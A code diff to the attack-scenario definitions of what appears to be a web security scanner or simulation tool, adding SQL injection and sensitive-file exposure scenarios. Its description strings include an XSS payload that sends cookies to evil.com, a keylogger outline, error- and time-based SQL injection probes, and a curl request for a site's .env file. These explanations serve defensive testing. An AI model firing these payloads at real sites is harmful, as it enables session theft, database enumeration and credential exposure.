@@ -5,7 +5,7 @@ export interface AttackScenario {
   objectiveSeverity: "critical" | "high";
   description: string;
   howItWorks: string;
-  simulationType: "clickjacking" | "xss-terminal";
+  simulationType: "clickjacking" | "xss-terminal" | "sqli-terminal" | "sensitive-file-terminal";
 }
 
 export const SCENARIO_MAP: Record<string, AttackScenario[]> = {
@@ -33,6 +33,7 @@ export const SCENARIO_MAP: Record<string, AttackScenario[]> = {
       simulationType: "clickjacking",
     },
   ],
+
   "missing-csp": [
     {
       id: "xss-session-theft",
@@ -40,9 +41,9 @@ export const SCENARIO_MAP: Record<string, AttackScenario[]> = {
       attackerObjective: "Authentication Token Theft",
       objectiveSeverity: "critical",
       description:
-        "Without Content-Security-Policy, any injected <script> tag executes freely in the page's origin. This simulation shows an attacker reading all session cookies and shipping them to a remote collection server in a single fetch().",
+        "Without Content-Security-Policy, any injected <script> tag executes freely in the page's origin. Uses a real Puppeteer browser to read live cookies and localStorage from the target URL — showing actual tokens if unprotected.",
       howItWorks:
-        "Payload: <script>fetch('//evil.com?c='+btoa(document.cookie))</script>. With no script-src policy, the browser executes this in the full origin context — reading every cookie, token, and credential stored for that site.",
+        "Payload: <script>fetch('//evil.com?c='+btoa(document.cookie))</script>. With no script-src policy, the browser executes this with full origin privilege — reading every cookie and storage token scoped to that domain.",
       simulationType: "xss-terminal",
     },
     {
@@ -51,10 +52,42 @@ export const SCENARIO_MAP: Record<string, AttackScenario[]> = {
       attackerObjective: "Real-Time Credential Capture",
       objectiveSeverity: "critical",
       description:
-        "An injected keylogger script hooks the keyboard event listener and silently forwards every keystroke — passwords, credit card numbers, PINs — to the attacker's endpoint. The victim sees nothing.",
+        "An injected keylogger hooks the keyboard event listener and silently forwards every keystroke to the attacker. Type into the victim login form — the terminal streams your exact keystrokes in real time alongside live browser storage data.",
       howItWorks:
-        "Payload injects document.addEventListener('keydown', fn). Each character is buffered and POSTed every 5 seconds to an attacker-controlled API. Captures passwords even before form submission.",
+        "Payload injects document.addEventListener('keydown', fn). Each character is buffered and POSTed to an attacker-controlled API. Captures passwords even before form submission.",
       simulationType: "xss-terminal",
+    },
+  ],
+
+  // ── SQL Injection ────────────────────────────────────────────────────────────
+  // Matched by prefix: any finding ID starting with "sqli-" (except no-params / not-detected)
+  "sqli": [
+    {
+      id: "sqli-live-extraction",
+      name: "Live DB Metadata Extraction",
+      attackerObjective: "Database Enumeration / Data Exfiltration",
+      objectiveSeverity: "critical",
+      description:
+        "Enter any URL with a query parameter and the engine fires real error-based and time-based SQL injection probes. If vulnerable, it runs EXTRACTVALUE() payloads to extract the live database version, current user, and database name from the server response.",
+      howItWorks:
+        "Error-based: inject a quote to trigger a MySQL syntax error. Time-based: inject SLEEP(4) to confirm blind SQLi. EXTRACTVALUE(1, concat(0x7e, @@version)) leaks data in the XPath error message.",
+      simulationType: "sqli-terminal",
+    },
+  ],
+
+  // ── Sensitive File Exposure ──────────────────────────────────────────────────
+  // Matched by prefix: any finding ID starting with "sensitive-" (except sensitive-files-none)
+  "sensitive-file": [
+    {
+      id: "sensitive-file-live-read",
+      name: "Live File Content Reader",
+      attackerObjective: "Secret / Credential Exfiltration",
+      objectiveSeverity: "critical",
+      description:
+        "Select any common sensitive path (/.env, /.git/HEAD, /wp-config.php…) or enter a custom path. The engine sends a real HTTP GET to the target URL and reads the first 10 lines of any accessible file, redacting secret values for display.",
+      howItWorks:
+        "Attacker issues a direct GET request: curl https://target.com/.env — if the web server doesn't block access to dotfiles, the entire file is returned in the response body with all environment variables, API keys, and credentials visible.",
+      simulationType: "sensitive-file-terminal",
     },
   ],
 };
